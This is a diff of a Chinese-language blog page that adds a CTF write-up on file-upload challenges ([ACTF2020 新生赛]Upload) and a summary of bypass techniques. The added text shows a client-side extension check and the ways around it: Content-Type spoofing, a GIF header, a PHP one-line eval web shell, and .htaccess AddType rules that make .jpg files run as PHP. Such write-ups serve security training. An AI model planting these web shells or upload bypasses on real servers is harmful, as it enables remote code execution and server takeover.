@@ -43,8 +43,11 @@
 <meta property="og:image" content="http://downbeat.top/capture_20241206200818057.bmp">
 <meta property="og:image" content="http://downbeat.top/capture_20241206193736442.bmp">
 <meta property="og:image" content="http://downbeat.top/capture_20241206201337073.bmp">
+<meta property="og:image" content="http://downbeat.top/capture_20241206202925943.bmp">
+<meta property="og:image" content="http://downbeat.top/capture_20241206203130844.bmp">
+<meta property="og:image" content="http://downbeat.top/image-20241206202750063.png">
 <meta property="article:published_time" content="2024-12-06T09:06:43.000Z">
-<meta property="article:modified_time" content="2024-12-06T12:14:31.072Z">
+<meta property="article:modified_time" content="2024-12-06T12:42:33.050Z">
 <meta property="article:author" content="downbeat">
 <meta property="article:tag" content="ctf-web">
 <meta property="article:tag" content="文件上传">
@@ -240,8 +243,8 @@
     
         <span class="article-date article-meta-item">
             <i class="fa-regular fa-wrench"></i>&nbsp;
-            <span class="desktop">2024-12-06 20:14:31</span>
-            <span class="mobile">2024-12-06 20:14:31</span>
+            <span class="desktop">2024-12-06 20:42:33</span>
+            <span class="mobile">2024-12-06 20:42:33</span>
             <span class="hover-info">更新</span>
         </span>
     
@@ -267,12 +270,12 @@
     
     
         <span class="article-wordcount article-meta-item">
-            <i class="fa-regular fa-typewriter"></i>&nbsp;<span>1.2k 字</span>
+            <i class="fa-regular fa-typewriter"></i>&nbsp;<span>1.6k 字</span>
         </span>
     
     
         <span class="article-min2read article-meta-item">
-            <i class="fa-regular fa-clock"></i>&nbsp;<span>4 分钟</span>
+            <i class="fa-regular fa-clock"></i>&nbsp;<span>6 分钟</span>
         </span>
     
     
@@ -424,7 +427,40 @@
 <p>然后再次上传一次shell.jpg即可，访问看一下：</p>
 <p><img lazyload src="/images/loading.svg" data-src="/../capture_20241206201337073.bmp"></p>
 <p>ok，成功解析为php文件</p>
-<h3 id="蚁剑连接❤️❤️-1"><a href="#蚁剑连接❤️❤️-1" class="headerlink" title="蚁剑连接❤️❤️"></a>蚁剑连接❤️❤️</h3><p>跟第一题是一样的，也是在根目录下面</p>
+<h2 id="蚁剑连接❤️❤️-1"><a href="#蚁剑连接❤️❤️-1" class="headerlink" title="蚁剑连接❤️❤️"></a>蚁剑连接❤️❤️</h2><p>跟第一题是一样的，也是在根目录下面</p>
+<h1 id="ACTF2020-新生赛-Upload"><a href="#ACTF2020-新生赛-Upload" class="headerlink" title="[ACTF2020 新生赛]Upload"></a>[ACTF2020 新生赛]Upload</h1><h2 id="前端文件后缀检查"><a href="#前端文件后缀检查" class="headerlink" title="前端文件后缀检查"></a>前端文件后缀检查</h2><ul>
+<li>上传文件，发现有限制，且限制是以弹窗的形式给出，我们查看源代码中的&lt;script&gt;标签内容:</li>
+</ul>
+<p><img lazyload src="/images/loading.svg" data-src="/../capture_20241206202925943.bmp"></p>
+<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">checkFile</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> file = <span class="variable language_">document</span>.<span class="title function_">getElementsByName</span>(<span class="string">&#x27;upload_file&#x27;</span>)[<span class="number">0</span>].<span class="property">value</span>;</span><br><span class="line">    <span class="keyword">if</span> (file == <span class="literal">null</span> || file == <span class="string">&quot;&quot;</span>) &#123;</span><br><span class="line">        <span class="title function_">alert</span>(<span class="string">&quot;璇烽€夋嫨瑕佷笂浼犵殑鏂囦欢!&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//瀹氫箟鍏佽涓婁紶鐨勬枃浠剁被鍨�</span></span><br><span class="line">    <span class="keyword">var</span> allow_ext = <span class="string">&quot;.jpg|.png|.gif&quot;</span>;</span><br><span class="line">    <span class="comment">//鎻愬彇涓婁紶鏂囦欢鐨勭被鍨�</span></span><br><span class="line">    <span class="keyword">var</span> ext_name = file.<span class="title function_">substring</span>(file.<span class="title function_">lastIndexOf</span>(<span class="string">&quot;.&quot;</span>));</span><br><span class="line">    <span class="comment">//鍒ゆ柇涓婁紶鏂囦欢绫诲瀷鏄惁鍏佽涓婁紶</span></span><br><span class="line">    <span class="keyword">if</span> (allow_ext.<span class="title function_">indexOf</span>(ext_name) == -<span class="number">1</span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> errMsg = <span class="string">&quot;璇ユ枃浠朵笉鍏佽涓婁紶锛岃涓婁紶jpg銆乸ng銆乬if缁撳熬鐨勫浘鐗囧櫌锛�&quot;</span>;</span><br><span class="line">        <span class="title function_">alert</span>(errMsg);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<ul>
+<li>这里发现有对文件后缀经行检查，但是这只是服务器端前端的检查，我们抓包之后修改后缀即可，抓包之后修改的是后端的内容：</li>
+</ul>
+<p><img lazyload src="/images/loading.svg" data-src="/../capture_20241206203130844.bmp"></p>
+<ul>
+<li>访问检查一下：</li>
+</ul>
+<p><img lazyload src="/images/loading.svg" data-src="/../image-20241206202750063.png" alt="image-20241206202750063"></p>
+<h2 id="蚁剑连接❤️❤️-2"><a href="#蚁剑连接❤️❤️-2" class="headerlink" title="蚁剑连接❤️❤️"></a>蚁剑连接❤️❤️</h2><p>一样的步骤，flag也是在根目录下面</p>
+<h1 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h1><ul>
+<li>修改文件后缀绕过检查</li>
+<li>修改<code>Content-Type</code>，常见修改为：</li>
+</ul>
+<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">image/png</span><br><span class="line">image/jpeg</span><br></pre></td></tr></table></figure></div>
+
+<ul>
+<li>绕过对<code>&lt;?</code>的检查，<mark>php版本大于5.4<mark>，同时添加<code>GIF</code>头绕过检查</mark></mark></li>
+</ul>
+<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">GIF86</span>a; </span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">script</span> <span class="attr">language</span>=<span class="string">&#x27;php&#x27;</span>&gt;</span><span class="language-javascript">@<span class="built_in">eval</span>($_POST[<span class="string">&#x27;cmd&#x27;</span>]);</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br></pre></td></tr></table></figure></div>
+
+<ul>
+<li>修改<code>.htaccess</code>配置绕过不解析php文件，<mark>注意是在<code>Apache</code>服务器中，遇到的<code>openresty</code>服务器可用下列语句检查是否含有<code>Apache</code></mark></li>
+</ul>
+<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">ErrorDocument</span> <span class="number">403</span> <span class="string">&quot;Apache Detected&quot;</span></span><br></pre></td></tr></table></figure></div>
+
+<p>访问之后如果显示<code>Apache Detected</code>就说明包含有<code>Apache</code>，可以修改<code>.htaccess</code></p>
+<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">AddType</span>: application/x-httpd-php .<span class="property">jpg</span> </span><br><span class="line"><span class="comment">// 即将.jpg文件解析为php文件</span></span><br></pre></td></tr></table></figure></div>
 
         </div>
 
@@ -439,7 +475,7 @@
         
             <li>
                 <strong>更新于
-                    :</strong> 2024-12-06 20:14:31
+                    :</strong> 2024-12-06 20:42:33
             </li>
         
         <li>
@@ -552,7 +588,7 @@
     <div class="post-toc">
         <div class="toc-title">目录</div>
         <div class="page-title">文件上传</div>
-        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-Upload"><span class="nav-text">[极客大挑战 2019]Upload</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC"><span class="nav-text">一句话木马</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BF%AE%E6%94%B9content-type"><span class="nav-text">修改content-type</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#php%E5%90%8E%E7%BC%80%E7%BB%95%E8%BF%87"><span class="nav-text">php后缀绕过</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%BB%95%E8%BF%87"><span class="nav-text">绕过&lt;?</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%B7%BB%E5%8A%A0GIF%E5%A4%B4%E6%9D%A5%E4%BC%AA%E8%A3%85"><span class="nav-text">添加GIF头来伪装</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%9F%A5%E7%9C%8B%E6%96%87%E4%BB%B6"><span class="nav-text">查看文件</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%9A%81%E5%89%91%E8%BF%9E%E6%8E%A5%E2%9D%A4%EF%B8%8F%E2%9D%A4%EF%B8%8F"><span class="nav-text">蚁剑连接❤️❤️</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#GXYCTF2019-BabyUpload"><span class="nav-text">[GXYCTF2019]BabyUpload</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#htaccess"><span class="nav-text">.htaccess</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-%E4%BB%80%E4%B9%88%E6%98%AF-htaccess-%E6%96%87%E4%BB%B6%EF%BC%9F"><span class="nav-text">1.什么是 .htaccess 文件？</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-htaccess-%E5%B8%B8%E8%A7%81%E7%94%A8%E9%80%94"><span class="nav-text">2. .htaccess 常见用途</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%9A%81%E5%89%91%E8%BF%9E%E6%8E%A5%E2%9D%A4%EF%B8%8F%E2%9D%A4%EF%B8%8F-1"><span class="nav-text">蚁剑连接❤️❤️</span></a></li></ol></li></ol></li></ol>
+        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-Upload"><span class="nav-text">[极客大挑战 2019]Upload</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC"><span class="nav-text">一句话木马</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BF%AE%E6%94%B9content-type"><span class="nav-text">修改content-type</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#php%E5%90%8E%E7%BC%80%E7%BB%95%E8%BF%87"><span class="nav-text">php后缀绕过</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%BB%95%E8%BF%87"><span class="nav-text">绕过&lt;?</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%B7%BB%E5%8A%A0GIF%E5%A4%B4%E6%9D%A5%E4%BC%AA%E8%A3%85"><span class="nav-text">添加GIF头来伪装</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%9F%A5%E7%9C%8B%E6%96%87%E4%BB%B6"><span class="nav-text">查看文件</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%9A%81%E5%89%91%E8%BF%9E%E6%8E%A5%E2%9D%A4%EF%B8%8F%E2%9D%A4%EF%B8%8F"><span class="nav-text">蚁剑连接❤️❤️</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#GXYCTF2019-BabyUpload"><span class="nav-text">[GXYCTF2019]BabyUpload</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#htaccess"><span class="nav-text">.htaccess</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-%E4%BB%80%E4%B9%88%E6%98%AF-htaccess-%E6%96%87%E4%BB%B6%EF%BC%9F"><span class="nav-text">1.什么是 .htaccess 文件？</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-htaccess-%E5%B8%B8%E8%A7%81%E7%94%A8%E9%80%94"><span class="nav-text">2. .htaccess 常见用途</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%9A%81%E5%89%91%E8%BF%9E%E6%8E%A5%E2%9D%A4%EF%B8%8F%E2%9D%A4%EF%B8%8F-1"><span class="nav-text">蚁剑连接❤️❤️</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#ACTF2020-%E6%96%B0%E7%94%9F%E8%B5%9B-Upload"><span class="nav-text">[ACTF2020 新生赛]Upload</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%89%8D%E7%AB%AF%E6%96%87%E4%BB%B6%E5%90%8E%E7%BC%80%E6%A3%80%E6%9F%A5"><span class="nav-text">前端文件后缀检查</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%9A%81%E5%89%91%E8%BF%9E%E6%8E%A5%E2%9D%A4%EF%B8%8F%E2%9D%A4%EF%B8%8F-2"><span class="nav-text">蚁剑连接❤️❤️</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%80%BB%E7%BB%93%EF%BC%9A"><span class="nav-text">总结：</span></a></li></ol>
 
     </div>
 </div>
@@ -589,7 +625,7 @@
                     </span>
                     
                         <span>
-                            共 51.2k 字
+                            共 51.6k 字
                         </span>
                     
                 </p>
